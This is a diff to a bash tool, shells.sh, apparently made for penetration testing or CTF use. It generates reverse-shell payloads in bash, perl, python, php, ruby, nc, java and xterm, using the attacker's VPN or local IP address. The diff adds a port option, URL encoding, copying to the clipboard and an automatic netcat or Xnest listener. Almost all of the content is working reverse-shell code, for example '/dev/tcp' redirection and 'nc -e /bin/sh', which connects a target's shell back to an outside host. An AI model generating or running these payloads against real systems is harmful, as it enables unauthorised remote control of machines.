@@ -5,8 +5,14 @@
 
 
 error=$(cat /sys/class/net/tun0/operstate 2>/dev/null) # 2>/dev/null is used to suppress the error msg from cat if tun0 is not available
+pt=1234
+x=0 
 
- 
+PURPLE="35"
+BLUE="34"
+ENDCOLOR="\e[0m"
+BOLDPURPLE="\e[1;${PURPLE}m"
+BOLDBLUE="\e[1;${BLUE}m"
 
 urlencode() {
     # urlencode <string>
@@ -60,20 +66,22 @@ elif [ "$rev_shell" == "java" ]
 elif [ "$rev_shell" == "xterm" ]
 	then
 		rev_shell=$xterm
+		echo -e "To use this shell you need to authorize the target to connect to you using : xhost +targetip \non you machine\n"
 
 	
 else
 	echo not defined
 fi
-echo -e "Using IP: \e[1;35m$ip4\e[0m \n"
+echo -e "Using IP: ${BOLDPURPLE}$ip4${ENDCOLOR} \n"
+echo -e "Using Port: ${BOLDBLUE}$pt${ENDCOLOR} \n"
 echo "Shell:"
-echo -e "\e[1;38;5;220m$rev_shell\e[0m \n"
-
+echo -e "\e[1;38;5;220m$rev_shell${ENDCOLOR} \n"
+echo -e "$rev_shell" | xclip -selection clipboard
 }
 
 
 options=' Available shells \n 1.Bash \n 2.Python \n 3.Php \n 4.Ruby \n 5.Perl \n 6.Java \n 7.nc \n 8.xterm'
-help='Usage: ./shells.sh -s [shell type] -[flag] \n -h \t\t\t\t show help \n -s \t\t\t\t select a shell \n -v \t\t\t\t use virtual ip address \n -l \t\t\t\t use local ip address \n -u \t\t\t\t url encode the shell \n -o \t\t\t\t show options/shells'
+help='Usage: ./shells.sh -s [shell type] -[flag] \n -h \t\t\t\t show help \n -s \t\t\t\t select a shell \n -v \t\t\t\t use virtual ip address \n -l \t\t\t\t use local ip address \n -u \t\t\t\t url encode the shell \n -p \t\t\t\t specify a port \n -x \t\t\t\t do not start a listener automatically \n -o \t\t\t\t show options/shells'
 
 
     if [ "$error" == "unknown" ]
@@ -83,6 +91,10 @@ help='Usage: ./shells.sh -s [shell type] -[flag] \n -h \t\t\t\t show help \n -s 
 		ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
 	fi
 
+if [ "$1" == "" ]
+then
+	echo "No Options Specified, use -h for help"
+fi
 
 
 while :; do
@@ -131,7 +143,21 @@ while :; do
 
            -u|--url-encode)
 				url=1
-				shift
+				
+
+			   ;;
+		   -p|--port)
+				if [ "$2" ]
+				then
+					pt="$2"
+					shift
+				else
+					printf 'Port not specified, using default port 1234 %s\n' >&2 
+				fi
+
+			   ;;
+		   -x)
+					x=1
 
 			   ;;
            --)              # End of all options.
@@ -150,23 +176,23 @@ while :; do
 
 
 
-bash="bash -i >& /dev/tcp/$ip4/8080 0>&1"
+bash="bash -i >& /dev/tcp/$ip4/$pt 0>&1"
 
-perl="perl -e 'use Socket;$i=\"$ip4\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+perl="perl -e 'use Socket;$i=\"$ip4\";$p=$pt;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
 
-python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip4\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip4\",$pt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 
-php="php -r '$sock=fsockopen(\"$ip4\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+php="php -r '$sock=fsockopen(\"$ip4\",$pt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 
-ruby="ruby -rsocket -e'f=TCPSocket.open(\"$ip4\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+ruby="ruby -rsocket -e'f=TCPSocket.open(\"$ip4\",$pt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 
-nc="nc -e /bin/sh $ip4 1234"
+nc="nc -e /bin/sh $ip4 $pt"
 
 java="r = Runtime.getRuntime()
-p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip4/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
+p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip4/$pt;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
 p.waitFor() "
 
-xterm="xterm -display $ip4:1 (default port:6001)"
+xterm="xterm -display $ip4:1"
 
 
 if [ $sh ]
@@ -176,14 +202,22 @@ then
 	if [ $url ]
 	then
 		echo Url-encoded Shell:
-		last= urlencode "$rev_shell" 2>/dev/null
-		# echo  -e "\e[1;38;5;10m$last\e[0m \n"
-		
-	# else
-	# 	echo "Enter the shell you want"
-	# 	echo "Try -h for more options"	
+		urlencode "$rev_shell"
+		echo -e "\n"
+			
 	fi
+	if [ "$x" == "0" ]
+	then
+		echo "Starting a listener on port: $pt"
+		echo "---------------------------------"
 
+		if [ "$rev_shell" == "xterm -display 192.168.189.128:1" ]
+		then
+			Xnest :1
+		else
+			nc -lnvp $pt
+		fi
+	fi
 fi
 
-# echo -e "\e[1;38;5;220m$rev_shell\e[0m \n"
+
